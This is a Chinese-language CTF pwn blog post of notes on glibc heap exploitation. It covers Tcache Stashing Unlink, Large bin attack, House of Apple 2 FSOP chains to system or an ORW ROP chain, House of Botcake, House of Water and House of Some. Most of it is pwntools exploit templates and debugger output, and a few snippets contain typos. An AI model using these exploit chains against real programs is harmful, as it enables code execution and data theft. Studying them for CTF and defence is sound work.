---
title: "Heap & House"
date: 2024-01-01
draft: false
summary: "关于 House of 系列攻击的系统梳理与实战笔记。"
tags: ["pwn", "heap"]
---

<!--more-->


## 0x0:Tcache Stashing Unlink Attack

在Glibc2.29中也没有对 Small bin的 malloc 做更多保护，利用点如下：

**bin->bk = bck; bck->fd = bin;**

下面给出详细实现，即假设有结构：

```
smallbins->small_chunk1->small_chunk2
```

我们在题目有calloc的情况下，tcache对应size未满，smallbins有两个chunk，只需要修改small_chunk1的bk指针为【修改的地址-0x10】即可，另外地，还需要我们伪造fd指针和chunk_size

例题参考：【BUUOJ-2020 新春红包题-3】

给一段实现脚本：

```
    for i in range(9):
        add(i,0x400,b'a')
    for i in range(9):
        delete(i)
    for i in range(5):
        add(i+9,0x100,b'b')
    for i in range(5):
        dele(i+9)         
#上面在处理使tcache的0x100有5个,0x400能放入unsortedbins
    add(0,0x300,'a') #将chunk7分割只剩0x100
    add(0,0x400,'b') #剩下的0x100进入smallbins
    add(1,0x400,'a')  
    delete(0)
    add(1,3,'a') #将chunk0分割只剩0x100
    add(1,4,'b') #剩下的chunk进入smallbins
    pl = 'a'*0x300
    pl += p64(0) + p64(0x101)
    pl += p64(real_fd)
    pl += p64(target_addr - 0x10)
    edit(0,pl)
```

## 0x1:Large bin Attack

我们可以通过改写large bin的bk_nextsize的值来向指定的位置写入一个堆地址，也就是这里存在一个任意地址写堆地址的漏洞，即把chunk2的头地址写入&target

```
add(0,0x520) #chunk0
add(1,0x508) #padding
add(2,0x510) #chunk2
add(3,0x500) #padding
dele(0) 
dele(2) #unsorted bin-->chunk2-->chunk0
show(2) 
heap_addr = u64(io.recvuntil(b'\n',drop=True).ljust(8,b'\x00')) - 0x290
print(hex(heap_addr))
add(4,0x510) #large bin-->chunk0
dele(2) #unsorted bin-->chunk2
show(0)
libc_addr = u64(io.recvuntil(b'\n',drop=True).ljust(8,b'\x00')) + 0x70017c153000 - 0x70017c337030
print(hex(libc_addr))
_IO_wfile_jumps = libc_addr + libc.symbols['_IO_wfile_jumps']
io_list_all = libc_addr + libc.symbols['_IO_list_all']
system_addr = libc_addr + libc.symbols['system']
fake_addr1 = 0x70125399d030 - 0x7012537b9000 + libc_addr
edit(0,p64(fake_addr1)*2 + p64(heap_addr+0x290) + p64(io_list_all-0x20))
add(10,0x550) #large bin-->chunk2-->chunk0
效果是：&io_list_all = *chunk2
```

## 0x2:House of 🍎②
![](https://ret2ldz.github.io/images/apple.png)
这块的东西有点多，但这条链子实在是很厉害。
### 调用链如下，如需调试直接b *_IO_wdoallocbuf即可
```
exit -->> __run_exit_handlers -->> _IO_cleanup -->> _IO_flush_all_lockp 
-->> _IO_wfile_overflow -->> _IO_wdoallocbuf -->> _IO_WDOALLOCATE
-->> *(fp->_wide_data->_wide_vtable + 0x68)(fp)/
     *(fp->_wide_data->_wide_vtable->_doallocate)(fp)
```
### NO SANDBOX
直接执行system的板子，适用于无沙箱可泄露heap、libc地址的题目
```
_IO_wfile_jumps = libc_addr + libc.symbols['_IO_wfile_jumps']
io_list_all = libc_addr + libc.symbols['_IO_list_all']
system_addr = libc_addr + libc.symbols['system']
fake_addr1 = 0x70125399d030 - 0x7012537b9000 + libc_addr
#需要调试修改
edit(0,p64(fake_addr1)*2 + p64(heap_addr+0x290) + p64(io_list_all-0x20))
add(10,0x550)
fake_heap = heap_addr + 0xcd0 #需要调试修改
edit(1,b'\x00'*0x500 + p64(0x3b68732020))
fake_IO_FILE=0x18*b'\x00' + p64(1)# _write_ptr
fake_IO_FILE=fake_IO_FILE.ljust(0xa0-0x10,b'\x00')+p64(fake_heap+0x100)# _wide_data
fake_IO_FILE=fake_IO_FILE.ljust(0xd8-x10,b'\x00')+p64(_IO_wfile_jumps)# _vtable
fake_IO_FILE=fake_IO_FILE.ljust(0x100-0x10,b'\x00')

fake_wide_data=''
fake_wide_data=b'\x00'*0xe0 + p64(fake_heap+0x200)# _wide_vtable
fake_wide_data=fake_wide_data.ljust(0x100,b'\x00')

fake_vtable=''
fake_vtable=0x68*b'\x00'+p64(system_addr)
#fake_vtable=0x68*b'\x00'+p64(one_gadget)
fake_IO_FILE=fake_IO_FILE+fake_wide_data+fake_vtable
edit(2,fake_IO_FILE)
```
我们可以使用gdb>p (*(struct _IO_FILE_plus *)addr)，来快捷查看我们是否正确覆盖了结构体
### ORW
##### 遇到开了沙箱的题目需要orw，我们需要用setcontext gadget通过rdi控制rsp去进行栈迁移执行shellcode，但是因为现在 setcontext 用的是 rdx 寄存器，所以还利用了一个 magic_gadget
mov rdx, qword ptr [rdi + 8]
mov qword ptr [rsp], rax
call qword ptr [rdx + 0x20];
##### 如何寻找MAGIC GADGET??
寻找方法1：在ida内使用ALT+T寻找指令
```
mov     rdx, [rdi+8]
```
寻找方法2：推荐使用这种排查
```
┌──(kali㉿kali)-[~/Desktop/apple/2.32-0ubuntu3.2_amd64]
└─$ ROPgadget --binary ./libc.so.6 --only "mov|call"| grep rdx > 1.txt && cat 1.txt|grep rdi
```
将原本system的位置放magic gadget，通过magic gadget设置rdx并且调用setcontext，最后通过setcontext调用rop_chain，因此exp调用链：apple_exp-->magic-->setcontext-->rop_chain
```
list1 = b'\x00'*(0x68-0x10) + p64(heap1-0x10) #heap1 is target to fake_IO_FILE
list1 = list1.ljust(0xf0,b'\x00')

fake_IO_FILE=p64(0) + p64(rop)
fake_IO_FILE+=0x18*b'\x00' + p64(1)# _write_ptr in offset 0x30
fake_IO_FILE=fake_IO_FILE.ljust(0xa0,b'\x00')+p64(heap2-0x10)# _wide_data in offset 0xa0,heap2 is target to fake_wide_data
fake_IO_FILE=fake_IO_FILE.ljust(0xd8,b'\x00')+p64(_IO_wfile_jumps)# _vtable is offset 0xd8
fake_IO_FILE=fake_IO_FILE.ljust(0x100,b'\x00')

fake_wide_data=''
fake_wide_data=b'\x00'*0xe0 + p64(heap3-0x10)# _wide_vtable, heap3 is target to fake_vatble
fake_wide_data=fake_wide_data.ljust(0x100,b'\x00')

fake_vtable=''
fake_vtable=0x68*b'\x00'+p64(magic)
setcontext = l + libc.sym.setcontext + 61
rop_1=b'./flag\x00\x00'+p64(0)*3+p64(setcontext)#setcontext
rop_1=rop_1.ljust(0xa0,b'\x00')+p64(rop+0x200)+p64(ret)

orw=p64(pop_rdi_ret)+p64(rop)
orw+=p64(pop_rsi_ret)+p64(0)
orw+=p64(pop_rax_ret)+p64(2)
orw+=p64(syscall_ret)
    
orw+=p64(pop_rdi_ret)+p64(3)
orw+=p64(pop_rsi_ret)+p64(rop+0x300)
orw+=p64(pop_rdx_r12_ret)+p64(0x45)+p64(0)
orw+=p64(pop_rax_ret)+p64(0)
orw+=p64(syscall_ret)

orw+=p64(pop_rdi_ret)+p64(1)
orw+=p64(pop_rsi_ret)+p64(rop+0x300)
orw+=p64(pop_rdx_r12_ret)+p64(0x45)+p64(0)
orw+=p64(pop_rax_ret)+p64(1)
orw+=p64(syscall_ret)

rop_2=rop_1.ljust(0x200,b'\x00')+orw

fake_io = list1 + fake_IO_FILE + fake_wide_data + fake_vtable
```
## 0x3:House of 🤖🎂

在 ***2.29/2.27*** 高版本之后，glibc 为了防止攻击者简单的 Tcache Double Free，引入了对 Tcache Key 的检查。 当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 key == tcache_key ， 就会遍历这个大小的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。 

***house of botcake的思想是利用堆块的后向合并使我们的利用堆块attacker被前面的堆块在unsorted bin内合并***

```
for i in range(10):
	add(i)
for i in range(7):
	dele(i) #填满tcache：tcache[7]
dele(8) #attacker :unsorted bin-->attacker
dele(7) #helper :unsorted bin-->big_chunk(helper+attacker)
add(10) #从tcache中取：tcache[6]
dele(8) #double free success!!!
```

## 0x4 House of 🍊 

##### 适用条件：(glibc 2.23 ~ glibc 2.26,程序中无free功能)

🍊过期辣，👴不学了

## 0x5 House of 💧

**适用条件：解决无SHOW，存在UAF，且能够申请巨大堆块的题目，作用是泄露地址。**

原理：tcache struct存在两个数组，一个存储指针，一个存储对应指针的堆块数量（一单位2字节）。如果我们申请两个大小相邻的堆块，我们就可以在堆块数量处构造出0x00010001，**如果我们能把这个0x10001作为fake_chunk的size放入unsorted bin，由于unsorted bin会给fd和bk赋值我们就可以给这里面的前面的几个数组指针赋值上libc地址，再次申请即可申请到libc内的堆块**。

**`我认为还有一个成因是因为tcache直接指向chunk的内容，而unsorted bins指向chunk的头部，我们且看下文就可以明白。`**

**绕过检查：**而我们需要绕过的就是让这样 fake unsorted chunk 在结束的时候的下个 chunk 的 prev_size 为 0x10000，且 size 的 issue 位为 0，因此我们需要申请大堆块，使prev size合法。

```
pwndbg> x/2gx 0x55929cefb080+0x10000
0000000000010000 0000000000000020
```

**利用：**我们试着将两个chunk放入unsorted bin的时候，我们可以在unsorted_start-0x8和unsorted_end-0x8的位置上伪造size=0x20和size=0x30，然后释放其，可以看到 fake chunk 的fd 指针已经指向 unsorted_end，bk 指针已经指向 unsorted_start，因为其size底下正好是0x20、0x30堆块的指针，

```
0x55929cefb070: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb080: 0x00000000      0x00000000      0x00010001      0x00000000//这里是伪造的size
0x55929cefb090: 0x9cefbcd0      0x00005592      0x9cefbc10      0x00005592//这里是通过释放fake_tcache写入的地址
```

然后，我们释放三个fake_unsorted堆块，所以不难想到接下来的操作就是令 unsorted_start 的 fd 指针指向 fake unsorted chunk，unsorted_end 的 bk 指针指向 fake unsorted chunk （需要爆破一位）即可完成 unsorted bin 上堆块替换操作。

![](https://ret2ldz.github.io/images/unnamed.drawio.png)

最困难的部分是：如何在在unsorted_start-0x10和unsorted_end-0x10的位置上伪造size0x20和size0x30，如下

```
for i in range(8):
    add(0x88)
play = add(0x20 + 0x30 + 0x500 + (0x90-8)*2) //创建play堆块
add(0x18)
dele(play)
add(0x18) #cut the head of play_chunk

corrupt = add(0x4d0-8) #we need to forge the size of this chunk
unsort_start = add(0x90-8)
unsort_mid = add(0x28)
unsort_end = add(0x90-8)
overs = add(0x28)

edit(play,p64(0x651),0x18) #let's free the corrupt,unsort_start,unsort_mid,unsort_end,over again!
dele(corrupt)

corrupt1 = add(0x4e0-8)
unsort_start1 = add(0x90-8)
unsort_mid1 = add(0x28)
unsort_end1 = add(0x90-8)
overs1 = add(0x18) #these five chunk have 10 offset compare to the prev fives

add(0x908080-0x8f8da0-0x18)
fake_bkchunk = add(0x18)
edit(fake_bkchunk, p64(0x10000) + p64(0x20))
fake_tcache1 = add(0x3d8)
fake_tcache2 = add(0x3e8)
dele(fake_tcache1)
dele(fake_tcache2)

edit(play,p64(0x31),0x4e8)
dele(unsort_start)
edit(play,p64(0x91),0x4f8)

edit(play,p64(0x21),0x5a8)
dele(unsort_end)
edit(play,p64(0x91),0x5b8)
for i in range(7):
    dele(i)
dele(unsort_end1)//free 0x20,bk-->fake_chunk
dele(7)
dele(unsort_start1)//free 0x30,fd-->fake_chunk

l,h = get_leak()
edit(unsort_start1,p16((h << 12) + 0x80)) # start fd points to 'fake'
edit(unsort_end1,p16((h << 12) + 0x80),8)
win = add(0x888)
edit(win,b'A'*32)
```

成功样例

```
pwndbg> x/100x 0x55929cefb000
0x55929cefb000: 0x00000000      0x00000000      0x00000291      0x00000000
0x55929cefb010: 0x00010001      0x00000000      0x00000000      0x00070000
0x55929cefb020: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb030: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb040: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb050: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb060: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb070: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb080: 0x00000000      0x00000000      0x00010001      0x00000000//这里是伪造的size
0x55929cefb090: 0x9cefbcd0      0x00005592      0x9cefbc10      0x00005592//这里是通过释放fake_tcache写入的地址
0x55929cefb0a0: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb0b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb0c0: 0x00000000      0x00000000      0x9cefb600      0x00005592
0x55929cefb0d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb0e0: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb0f0: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb100: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb110: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb120: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb130: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb140: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb150: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb160: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb170: 0x00000000      0x00000000      0x00000000      0x00000000
0x55929cefb180: 0x00000000      0x00000000      0x00000000      0x00000000
pwndbg> bins
tcachebins
0x20 [  1]: 0x55929cefbcd0 ◂— 0
0x30 [  1]: 0x55929cefbc10 ◂— 0
0x90 [  7]: 0x55929cefb600 —▸ 0x55929cefb570 —▸ 0x55929cefb4e0 —▸ 0x55929cefb450 —▸ 0x55929cefb3c0 —▸ 0x55929cefb330 —▸ 0x55929cefb2a0 ◂— 0
0x3e0 [  1]: 0x55929cf0b0a0 ◂— 0
0x3f0 [  1]: 0x55929cf0b480 ◂— 0
fastbins
empty
unsortedbin//下面是释放real_chunk写入的地址
all: 0x55929cefbcd0 —▸ 0x55929cefb080 —▸ 0x55929cefbc10 —▸ 0x7f0357e11b20 (main_arena+96) ◂— 0x55929cefbcd0
smallbins
empty
largebins
empty
pwndbg> 
```
那么接下来如何做，当然是把0x90的堆块全申请出来，让fake unsorted bin指向main arena。
我们惊讶地发现，0x7ff96ec122a0这个地址和stdout的0x7ff96ec125c0只差三位，而且一般stdout后面几位不变（也许不用爆破？）

```
pwndbg> bins
tcachebins
0x20 [  1]: 0x7ff96ec122a0 (main_arena+2016) ◂— 0x7ffe9157ce82
0x30 [  1]: 0x7ff96ec122a0 (main_arena+2016) ◂— 0x7ffe9157ce82
0x40 [  0]: 0x55e9cee4f080 ◂— ...
0x50 [  0]: 0x55e9cee4f080 ◂— ...
0x90 [  1]: 0x55e9cee4fce0 ◂— 0
0x3e0 [  1]: 0x55e9cee5f0a0 ◂— 0
0x3f0 [  1]: 0x55e9cee5f480 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
0x10000-0x17ff0: 0x55e9cee4f080 —▸ 0x7ff96ec122a0 (main_arena+2016) ◂— 0x55e9cee4f080
pwndbg> p &stdout
$1 = (FILE **) 0x55e99e563060
pwndbg> x/10x 0x55e99e563060
0x55e99e563060: 0x6ec125c0      0x00007ff9      0x00000000      0x00000000
0x55e99e563070: 0x6ec118e0      0x00007ff9      0x00000000      0x00000000
0x55e99e563080: 0x6ec124e0      0x00007ff9
```
** 最后直接衔接stdout leak：p64(0xfbad1800)+p64(0x0)*3+'\x00'**

## HOUSE_OF_SOME

![img](https://blog.csome.cc/p/house-of-some/House-of-some.png)

```
fake_file_read = flat({
    0x00: 0, # _flags
    0x20: 0, # _IO_write_base
    0x28: 0, # _IO_write_ptr
    
    0x38: # _IO_buf_base r
    0x40: # _IO_buf_end r
	
    0x70: 0, # _fileno
    0x82: b"\x00", # _vtable_offset
    0xc0: 2, # _mode
    0xa0: wide_data的地址, # _wide_data
    0x68: 下一个调用的fake file地址, # _chain
    0xd8: _IO_wfile_jumps, # vtable
}, filler=b"\x00")

fake_wide_data = flat({
    0xe0: _IO_file_jumps - 0x48,
    0x18: 0,
    0x20: 1,
    0x30: 0,
}, filler=b"\x00")

fake_file_write = flat({
    0x00: 0x800 | 0x1000, # _flags
    
    0x20: 需要泄露的起始地址, # _IO_write_base
    0x28: 需要泄露的终止地址, # _IO_write_ptr

    0x70: 1, # _fileno
    0x68: 下一个调用的 fake file 地址, # _chain
    0xd8: _IO_file_jumps, # vtable
}, filler=b"\x00")
```

这是一条可以直接orw不需要setcontext的链子

https://github.com/CsomePro/Some-of-House/blob/main/SomeofHouse.py

```
#假设前面已经把4号堆块的头写入io_list_all
from SomeofHouse import HouseOfSome
...
chunk4_head = h + offset #chunk2&4 #io_list_all
libc = ELF('...')
libc.address = 0xxxxxxxxxx
...
edit(1,b'\x00'*0x500 + p64(0x8000 | 0x40 | 0x1000))
fake_file_start = chunk4_head + 0x200
hos = HouseOfSome(libc=libc, controled_addr=fake_file_start) #传参
# 构造第一个任意地址写原语
payload = hos.hoi_read_file_template(fake_file_start, 0x400, fake_file_start, 0) #指向并写入fake_file_start
edit(4,payload[16:])
exit()
#hos.bomb(p)
hos.bomb_orw(p,"./flag")
```







